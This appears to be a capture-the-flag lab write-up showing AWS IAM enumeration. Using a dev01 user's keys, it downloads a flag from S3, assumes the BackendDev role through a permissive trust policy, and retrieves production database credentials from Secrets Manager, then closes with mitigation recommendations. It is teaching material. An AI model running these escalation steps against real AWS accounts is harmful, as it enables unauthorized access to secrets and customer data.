---
sidebar_position: 1
---

## 1\: Initial Access – AWS Credentials

```json title="Output"
{
    "UserId": "AIDA3SFMDAPOWFB7BSGME",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/dev01"
}
```

## 2\. Enumerating User Permissions

With our identity confirmed as `dev01`, we need to find out what permissions this user has. Permissions can be attached in several ways, primarily through managed policies and inline policies.

### Attached Managed Policies

Managed policies are standalone policies that can be attached to multiple users, groups, or roles.

```bash title="List Attached Managed Policies"
$ aws iam list-attached-user-policies --user-name dev01 --profile iam_user
```

```json title="Output"
{
    "AttachedPolicies": [
        {
            "PolicyName": "AmazonGuardDutyReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess"
        },
        {
            "PolicyName": "dev01",
            "PolicyArn": "arn:aws:iam::794929857501:policy/dev01"
        }
    ]
}
```

**Findings:** The `dev01` user has two attached policies: the AWS-managed `AmazonGuardDutyReadOnlyAccess` and a custom policy named `dev01`.

### Inline Policies

Inline policies are embedded directly into a single user, group, or role.

```bash title="List Inline Policies"
$ aws iam list-user-policies --user-name dev01 --profile iam_user
```

```json title="Output"
{
    "PolicyNames": [
        "S3_Access"
    ]
}
```

**Finding:** The user has one inline policy named `S3_Access`. Let's inspect its contents to see what it allows.

```bash title="View Inline Policy: S3_Access"
$ aws iam get-user-policy --policy-name S3_Access --user-name dev01 --profile iam_user
```

```json title="Output: S3_Access Policy Document"
{
    "UserName": "dev01",
    "PolicyName": "S3_Access",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "s3:ListBucket",
                    "s3:GetObject"
                ],
                "Resource": [
                    "arn:aws:s3:::hl-dev-artifacts",
                    "arn:aws:s3:::hl-dev-artifacts/*"
                ]
            }
        ]
    }
}
```

This policy explicitly grants permission to list objects in the `hl-dev-artifacts` S3 bucket and download them (`GetObject`).

## 3\. Exploiting S3 Access to Find a Flag

Since we have access to the `hl-dev-artifacts` bucket, let's list its contents.

```bash title="List Objects in S3 Bucket"
$ aws s3 ls s3://hl-dev-artifacts --profile iam_user
```

```
2023-10-01 16:39:53       1235 android-kotlin-extensions-tooling-232.9921.47.pom
2023-10-01 16:39:53     214036 android-project-system-gradle-models-232.9921.47-sources.jar
2023-10-01 16:38:05         32 flag.txt
```

:::tip Found a Flag\!
A file named `flag.txt` stands out. Let's download it.
:::

```bash title="Download and View the Flag"
$ aws s3 cp s3://hl-dev-artifacts/flag.txt . --profile iam_user
download: s3://hl-dev-artifacts/flag.txt to ./flag.txt

$ cat flag.txt
Redactedc904551935c7514
```

While we've found a flag, our enumeration isn't over. The managed policies may reveal a path to greater privileges.

## 4\. Deeper Analysis of Managed Policies

Let's investigate the custom `dev01` managed policy. We first get the policy details to find its default version ID, which we need to view the policy document itself.

```bash title="Get Custom Policy Details"
$ aws iam get-policy --policy-arn arn:aws:iam::794929857501:policy/dev01 --profile iam_user
```

The output shows the `DefaultVersionId` is **v7**. Now we can retrieve the policy document for that version.

```bash title="Get Policy Version Document"
$ aws iam get-policy-version --policy-arn arn:aws:iam::794929857501:policy/dev01 --version-id v7 --profile iam_user
```

```json title="Output: dev01 Policy Document"
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:GetPolicyVersion",
                        // ... other read-only IAM actions
                    ],
                    "Resource": [
                        "arn:aws:iam::794929857501:user/dev01",
                        "arn:aws:iam::794929857501:role/BackendDev",
                        "arn:aws:iam::794929857501:policy/BackendDevPolicy",
                        // ... other resources
                    ]
                }
            ]
        },
        "VersionId": "v7",
        // ...
    }
}
```

**Key Finding:** This policy grants our `dev01` user several read-only IAM permissions, specifically allowing it to get information about the `BackendDev` role and its associated policy, `BackendDevPolicy`. This is our next lead.

## 5\. Enumerating the `BackendDev` IAM Role

Using the permissions granted by the `dev01` policy, we can now investigate the `BackendDev` role.

```bash title="Get Role Details"
$ aws iam get-role --role-name BackendDev --profile iam_user
```

```json title="Output: BackendDev Role Details"
{
    "Role": {
        "RoleName": "BackendDev",
        "Arn": "arn:aws:iam::794929857501:role/BackendDev",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::794929857501:user/dev01"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        // ...
    }
}
```

:::info Privilege Escalation Path Found
The `AssumeRolePolicyDocument` (also known as a trust policy) explicitly allows our `dev01` user to assume the `BackendDev` role. This is a direct path to privilege escalation.
:::

Before we assume the role, let's find out what permissions it has by examining its attached policy, `BackendDevPolicy`.

```bash title="Get BackendDevPolicy Details"
$ aws iam get-policy-version --policy-arn arn:aws:iam::794929857501:policy/BackendDevPolicy --version-id v1 --profile iam_user
```

```json title="Output: BackendDevPolicy Document"
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "ec2:DescribeInstances",
                        "secretsmanager:ListSecrets"
                    ],
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": [
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret"
                    ],
                    "Resource": "arn:aws:secretsmanager:us-east-1:794929857501:secret:prod/Customers-QUhpZf"
                }
            ]
        }
    }
}
```

**`BackendDev` Role Permissions:**

  * `ec2:DescribeInstances` on all instances.
  * `secretsmanager:ListSecrets` on all secrets.
  * `secretsmanager:GetSecretValue` on a **specific secret**: `prod/Customers`.

## 6\. Privilege Escalation and Accessing Secrets

Now we execute the privilege escalation by assuming the `BackendDev` role.

```bash title="Assume the BackendDev Role"
$ aws sts assume-role --role-arn arn:aws:iam::794929857501:role/BackendDev --role-session-name BackendDev --profile iam_user
```

This command returns temporary credentials (`AccessKeyId`, `SecretAccessKey`, `SessionToken`).

:::danger Action Required: Configure New Profile
You must manually add these new, temporary credentials to your `~/.aws/credentials` file under a new profile. Let's call it `BackendDev`.

```ini title="~/.aws/credentials"
[BackendDev]
aws_access_key_id = ASIA...
aws_secret_access_key = i2HL...
aws_session_token = IQoJ...
```

:::

Now, we can perform actions using the permissions of the `BackendDev` role by specifying `--profile BackendDev`. First, let's list the available secrets.

```bash title="List Secrets as BackendDev"
$ aws secretsmanager list-secrets --profile BackendDev
```

This command confirms we can see the `prod/Customers` secret. Finally, we retrieve its value.

```bash title="Get Secret Value as BackendDev"
$ aws secretsmanager get-secret-value --secret-id prod/Customers --profile BackendDev
```

```json title="Output: Secret Revealed"
{
    "ARN": "arn:aws:secretsmanager:us-east-1:794929857501:secret:prod/Customers-QUhpZf",
    "Name": "prod/Customers",
    "SecretString": "{\"username\":\"root\",\"password\":\"$DB$Admin12345\",\"engine\":\"mariadb\",\"host\":\"10.10.14.15\",\"port\":\"3306\",\"dbname\":\"customers\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-09-29T08:37:58.579000-04:00"
}
```

Success\! We have escalated privileges and retrieved sensitive database credentials from Secrets Manager.

## 7\. Findings and Mitigation Strategies

This exercise highlights several common IAM misconfigurations. The table below summarizes the findings and recommends security improvements.

| \# | Area | Observation | Risk / Impact | Recommendation |
| - | ---- | ----------- | ------------- | -------------- |
| **1** | **IAM User Keys** | `dev01` uses long-lived static access keys. | High risk of credential leakage from code, config files, or compromise. | **Enforce temporary credentials.** Disable static keys and require users to assume roles to perform actions. |
| **2** | **Overly Permissive Policies** | The `dev01` policy allowed enumeration of other IAM roles. | Users can map out privilege escalation paths within the account. | **Apply the principle of least privilege.** Only grant permissions essential for the user's immediate tasks. |
| **3** | **Broad Trust Policies** | The `BackendDev` role's trust policy allowed `dev01` to assume it without restrictions. | A compromised `dev01` user immediately leads to compromise of the `BackendDev` role. | **Restrict trust policies.** Add condition keys to limit *who* can assume the role and from *where* (e.g., source IP, MFA). |
| **4** | **Secrets Manager Access** | The `BackendDev` role had access to read production database credentials. | Exposure of highly sensitive production secrets, leading to potential data breach. | **Use resource-based policies on secrets.** Limit which specific roles or users can access each secret. Enable automatic rotation. |
| **5** | **S3 Data Exposure** | `dev01` had direct read access to an S3 bucket containing potentially sensitive files. | Potential for data exfiltration or discovery of sensitive information. | **Restrict S3 bucket policies.** Use AWS IAM Access Analyzer to continuously review and validate public and cross-account access. |